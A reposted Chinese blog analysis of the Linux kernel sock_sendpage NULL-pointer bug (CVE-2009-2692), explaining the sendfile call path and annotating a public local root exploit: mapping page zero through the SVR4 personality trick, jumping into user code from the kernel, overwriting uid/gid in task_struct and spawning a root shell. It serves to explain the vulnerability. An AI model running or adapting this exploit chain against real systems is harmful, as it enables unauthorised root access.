# [轉]sendpage 漏洞分析 CVE-2009-2692 - jeremyatchina - 博客园

> 原文：[`www.cnblogs.com/bittorrent/p/3264825.html`](https://www.cnblogs.com/bittorrent/p/3264825.html)

| 之前看了《[新爆内核高危漏洞 sock_sendpage 的利用分析的讨论](http://linux.chinaunix.net/bbs/thread-1130648-1-1.html) 》这篇帖子，在九贱兄和诸位 CUer 的指引下，大致弄清了整个漏洞的始末。现与大家分享（引用自[我的空间](http://hi.baidu.com/_kouu/blog/item/d2c092672cadce2daa184c60.html) ）。 有什么不足之处还望多多指教~

**内核的 BUG **

这个 BUG 首先得从 sendfile 系统调用说起。
考虑将一个本地文件通过 socket 发送出去的问题。我们通常的做法是：打开文件 fd 和一个 socket，然后循环地从文件 fd 中 read 数据，并将读取 的数据 send 到 socket 中。这样，每次读写我们都需要两次系统调用，并且数据会被从内核拷贝到用户空间(read)，再从用户空间拷贝到内核 (send)。

而 sendfile 就将整个发送过程封装在一个系统调用中，避免了多次系统调用，避免了数据在内核空间和用户空间之间的大量拷贝。
 ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count); 

虽然这个系统调用接收 in 和 out 两个 fd，但是有所限制，in 只能是普通文件，out 只能是 socket（这个限制不知道后来的内核版本有没有放宽）。

sendfile 系统调用在内核里面是怎么实现的呢？这个还是比较复杂，它在内核里面做了原来要在用户态做的事情：创建一个 pipe 对象作 buffer 用、从 in_fd 中读数据到 pipe 中、将 pipe 中的数据写到 out_fd、循环直到满足结束条件。
关于写数据到 out_fd 的过程，简要描述如下：
sys_sendfile  => 入口
do_sendfile  => 参数检查，其中会确定 out_fd 对应的 file 结构包含 sendfile 方法(out_file->f_op->sendpage)
do_splice_direct  => 最终调用到 out_file->f_op->splice_write，而 out_file 是个 socket，它的 f_op->splice_write 等于 generic_splice_sendpage
generic_splice_sendpage  => 最终调用到 out_file->f_op->sendpage，这个 sendpage 等于 sock_sendpage

sock_sendpage 的代码如下：

struct socket *sock;
int flags;
sock = file->private_data;
flags = !(file->f_flags & O_NONBLOCK) ? 0 : MSG_DONTWAIT;
if (more)      flags &#124;= MSG_MORE;
return sock->ops->sendpage(sock, page, offset, size, flags); 

注意，BUG 出现了，调用 sock->ops->sendpage 之前没有判断这个函数指针是否为 NULL。
(这里调用的 sock->ops->sendpage 就是 out_file->f_op->private_data->ops->sendpage，out_file->f_op->private_data 指针指向的是一个 struct socket 结构，因为这个 fd 代表的是一个 socket。)

但是，这里的 sock->ops->sendpage 可能是 NULL 吗？搜索内核代码可以发现，并不是每一种类型的 socket 都会实现 sendpage 这个函数。但是大多数没有实现这个函数的 socket 都将这个函数指针设为 sock_no_sendpage(这基本上是一个例行公事的 空函数)。但是，有少数类型的 socket 却没有设置 sock->ops->sendpage(没设置，则默认为 NULL)，如 PF＿PPPOX、PF＿BLUETOOTH、等等。(上面链接给出的代码就利用了 PF＿PPPOX，后来我发现，用 PF＿BLUETOOTH 也能达到一 样的效果，而换用 PF_INET 之类的却不行。)

**利用这个 BUG **

前面我们看到，内核在 sendfile 系统调用中，没有判断 sock->ops->sendpage 是否为空，就对它进行调用，并且 sock->ops->sendpage 的确可能为空。

如果我们的程序中调用一个值为 NULL 的函数指针，其结果会怎样？自然是程序崩溃，也仅仅就是崩溃而已。那么，这么个东西是怎么被利用，并实现窃取 root 身份的呢？让我们逐步解读上面链接给出的代码。
主函数 main()：
 char template[] = "/tmp/padlina.XXXXXX";  
int fdin, fdout;  
void *page;  
uid = getuid();  // 获取用户 ID，后面有用 
gid = getgid();  // 获取用户组 ID，后面有用 
setresuid(uid, uid, uid);  // 确保用户 ID 被设置到进程中 
setresgid(gid, gid, gid);  // 确保用户组 ID 被设置到进程中 
// 以下几句就狠了，它把 0～1000 的地址做了映射，并且置可执行属性 
if ((personality(0xffffffff)) != PER_SVR4) {      if ((page = mmap(0x0, 0x1000, PROT_READ &#124; PROT_WRITE, MAP_FIXED &#124; MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {           perror("mmap") ;           return -1;      }  
} else {      if (mprotect(0x0, 0x1000, PROT_READ &#124; PROT_WRITE &#124; PROT_EXEC) < 0) {           perror("mprotect") ;           return -1;      }  
}  
// 以下几句更狠，在刚刚映射的 0 地址上写下 JMP 到 kernel_code 的指令 
*(char *)0 = '/x90';  // nop 
*(char *)1 = '/xe9';  // jmp 
*(unsigned long *)2 = (unsigned long)&kernel_code – 6;  // 这里是相对跳转，-6 就是减去当前地址的地址值 
// 创建一个临时文件，用作源文件 
if ((fdin = mkstemp(template)) < 0) {      perror("mkstemp") ;      return -1;  
}  
// 创建一个 socket，注意其类型为 PF_PPPOX 
if ((fdout = socket(PF_PPPOX, SOCK_DGRAM, 0)) < 0) {      perror("socket") ;      return -1;  
}  
// 下面重点就是 sendfile 了 
unlink(template);  
ftruncate(fdin, PAGE_SIZE);  
sendfile(fdout, fdin, NULL, PAGE_SIZE);  

经过前面的介绍，我们可以看到，这里的 sendfile 将在系统调用中触发对 0 地址的调用。然而，现在 0 地址上已经被写下了 JMP 到 kernel_code 的指令。
这里的 kernel_code 实际上是和这个 main 在一起编译的一个函数，下面我们将会看到。

**现在的处境** 

进入 sendfile 系统调用后，CPU 进入内核态。内核态能干任何 CPU 能干的事情，一般情况下，只有内核代码能在内核态下执行，这是由内核来保证的。 但是现在，内核代码调用了 0 地址的函数，进入了用户代码 kernel_code。于是，程序员可以在他们自己写的 kernel_code 代码中干任何内核 能干的事情。
注意，一般从内核态返回到用户态有专门的指令(比如 iret)，它会同时改变 CPU 特权级别。但是现在的情况不是这样，内核代码相当于是直接调用程序员写的函数，并没有返回用户态。

然而另一方面，内核代码可以轻松地访问内核的数据结构，因为内核代码是在一块编译的，对象的地址都知道、结构都清楚。而现在程序员写在 kernel_code 里的代码呢？尽管他们拥有与内核代码一样的访问权限，但是却不知道数据的地址和状态，他们现在是个瞎子。
下面，你会看到在 kernel_code 的代码中，示例代码的作者是怎样摸着石头过河的。

**开始干坏事了** 

kernel_code 函数主要分三个步骤：

1、获取 task_struct
 uint *p = get_current(); 

其中 get_current 的代码如下：

__asm__ __volatile__ (      "movl %%esp, %%eax ;"  // 将栈指针的值赋给 EAX      "andl %1, %%eax ;"  // 将这个栈指针值与~8191(后 13bit 为 0)取与      "movl (%%eax), %0"  // 将结果输出到 curr 变量中，此即 task_struct 指针      : "=r" (curr)      : "i" (~8191)  
);  

在内核中，每个进程拥有一个 thread_info 结构，以及内核栈。这两样东西是分配在两个连续的 page 中的，并且 thread_info 结构在前， 栈在后。thread_info 结构的第一个元素是 task，它是一个指向 task_struct 结构(即通常所说的进程控制块)的指针。在这个 task_struct 结构中就保存着进程的主要信息。
（注：linux 2.4 时，这里的两个 page 存放着 task_struct 结构和内核栈，并没有 thread_info 这样一层。）
在 32 位系统中，一个 page 的大小是 4K，page 的首字节的地址后 12bit 为 0。而 task_struct 结构相当于是两 page 对齐的，其首地址的后 13bit 为 0。
由此，通过栈指针的值，将后 13bit 清 0 后，得到进程对应的 thread_info 结构，再以 thread_info 结构为指针（该结构的第一个字，即指向 task_struct 结构的 task 指针），便能得到 task_struct 结构。
（其实，通过这样一段汇编代码拿到 task_struct 结构还是比较笨的办法。最简单的办法是：取当前栈上定义的任意一个变量，将其地址的后 13 位清 0 即可。）

2、拿到了 task_struct，要干什么呢？示例代码的目标是修改 task_struct 中记录的用户信息，以使得这个进程变成是由 root 启动的进程。

for (i = 0; i < 1024-13; i++) {       
     if (p[0] == uid && p[1] == uid && p[2] == uid && p[3] == uid && p[4] == gid && p[5] == gid && p[6] == gid && p[7] == gid) {           p[0] = p[1] = p[2] = p[3] = 0;           p[4] = p[5] = p[6] = p[7] = 0;           p = (uint *) ((char *)(p + 8 ) + sizeof(void *));           p[0] = p[1] = p[2] = ~0;           break;      }      p++;  
}  

回想一下，在 main 函数中已经获取了用户和用户组 ID，并设置到了进程中(设置到进程了 task_struct 结构中)。于是，搜索 task_struct 结构，试图匹配这几个 ID。因为在不同版本的内核中，这几个 ID 放置的位置可能不大相同，但它们出现的顺序总是相同的。
如果被匹配到，那么就找到了这几个 ID 的存放地。然后，就可以将它们全部改为 0。于是这个进程就变成 root 用户的进程了。

不过这种修改 uid 的方法在较新版本的内核中已经行不通了，uid、gid 这些信息已经不是直接放在 task_struct 结构中，而是整理到一个叫 cred 的结构，然后 task_struct 结构保存了指向对应 cred 结构的指针。

3、回到用户态
好了，身份已经改好，程序回到用户态去，启动一个 shell，然后好好体会 root 生活吧～

__asm__ __volatile__ (      "movl %0, 0x10(%%esp) ;"      "movl %1, 0x0c(%%esp) ;"      "movl %2, 0x08(%%esp) ;"      "movl %3, 0x04(%%esp) ;"      "movl %4, 0x00(%%esp) ;"      "iret"      : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),      : "i" (USER_CS), "r" (exit_code)  
);  

这段代码就是将返回地址压在内核栈上，然后 iret 返回用户态。返回地址被指定到 exit_code 上，这也是和 main 编译在一起的一个函数。其代码如下：

if (getuid() != 0) {      fprintf(stderr, "failed/n") ;      exit(-1);  
}  
execl("/bin/sh", "sh", "-i", NULL);  

现在程序已经回到用户态了，调用 getuid 看看是不是已经成了 root。确认无洖，启动 shell 吧～

**问题的点睛** 

虽然上面的叙述一口气把这个内核漏洞的来龙去脉讲通了，但是有个重要的细节却一笔代过了。那就是映射 0 地址的部分，我觉得这才是整个攻击代码的点睛之笔。其代码大致如下：

if ((personality(0xffffffff)) != PER_SVR4) {      mmap(0x0, 0x1000, PROT_READ &#124; PROT_WRITE, MAP_FIXED &#124; MAP_ANONYMOUS, 0, 0); } else {      mprotect(0x0, 0x1000, PROT_READ &#124; PROT_WRITE &#124; PROT_EXEC);
} 
映射 0 地址，为什么不是直接的 mmap，还要有这样的分支语句呢？personality 函数和 mprotect 函数又是什么意思？
其实，这段攻击代码编译成的可执行文件（记为 exploit）并不是直接在 shell 上面执行的。而是通过一段 C 代码来执行（见源码中的 run.c）：

int main(void) {      if (personality(PER_SVR4) < 0) {           perror("personality") ;           return -1;      }      fprintf(stderr, "padlina z lublina!/n") ;      execl("./exploit", "exploit", 0);
} 
可以看到，在执行之前，也调用了 personality 函数。

linux 内核具有很强的兼容性，不仅可以执行 linux 下编译的可执行文件，还可以执行在其他操作系统下编译的可执行文件：对于 windows 等一些操 作系统上的可执行文件，linux 通过运行于用户态的虚拟机程序（如 wine）来运行；而对于某些类 unix 系统的可执行文件，linux 则可以直接执 行。
然而 linux 直接执行类 unix 系统的可执行文件，也并不是无缝的，需要设置“执行域”来告诉内核当前执行的是某某系统的可执行文件。于是，linux 内核就会根据对应的类 unix 系统的规则（比如内存布局、信号处理等）来运行程序。

上面看到的 personality 函数就是用来设置“执行域”的（默认的执行域就是 linux），而上面的启动代码就通过 personality 函数将进 程的执行域设置为 SVR4（一种较老的类 unix 系统，System V Release 4）。于是，在映射 0 地址时将走到调用 mprotect 函数的分支（personality(0xffffffff)表示获取当前的执行域）。
mmap 是用来分配进程虚拟内存区域的函数，分配的同时可以设置其属性；而 mprotect 函数则是专门设置虚拟内存区域属性的函数。上面的攻击代码中，通过这个函数，把 0 地址设置为可执行。

在我的系统上，如果直接在 shell 上执行 exploit 程序（走 mmap 的分支），mmap 会失败。因为在 32 位 linux 上，进程地址空间是从 0x08048000 开始使用的（依次是可执行代码区、全局数据区、堆、文件映射区、栈），从 0 地址到 0x08048000 的空间并不能被映射。

exploit 程序之所以能够映射 0 地址，是因为发现了在 SVR4 这种执行域下，进程能够映射 0 地址。确切的说，0 地址默认是有映射的存在的，代码只是修改了这个映射的属性。

在 linux 2.6.29.4 的代码中找到了以下一些内容：
personality.h，对 SVR4 执行域有如下选项定义（注意其中有个 MMAP_PAGE_ZERO 标记）：
enum {
......
PER_SVR4 =   0x0001 &#124; STICKY_TIMEOUTS &#124; MMAP_PAGE_ZERO,
......
}; 
binfmt_elf.c:load_elf_binary()，在加载 elf 格式（linux 下最常用的格式）的可执行文件时，有如下代码（针对 MMAP_PAGE_ZERO 标记做了特殊处理）：
......
if (current->personality & MMAP_PAGE_ZERO) {
/* Why this, you ask??? Well SVr4 maps page 0 as read-only,        and some applications "depend" upon this behavior.        Since we do not have the power to recompile these, we        emulate the SVr4 behavior. Sigh. */       down_write(&current->mm->mmap_sem);        error = do_mmap(NULL, 0, PAGE_SIZE, PROT_READ &#124; PROT_EXEC,        MAP_FIXED &#124; MAP_PRIVATE, 0);        up_write(&current->mm->mmap_sem);
}
...... 
看到作者的注释了吧~ 就这样，0 地址被映射了。

一篇分析这个内核 BUG 的 paper:
[`hi.baidu.com/wzt85/blog/item/a11e013e3384f2f3838b13e6.html`](http://hi.baidu.com/wzt85/blog/item/a11e013e3384f2f3838b13e6.html)  |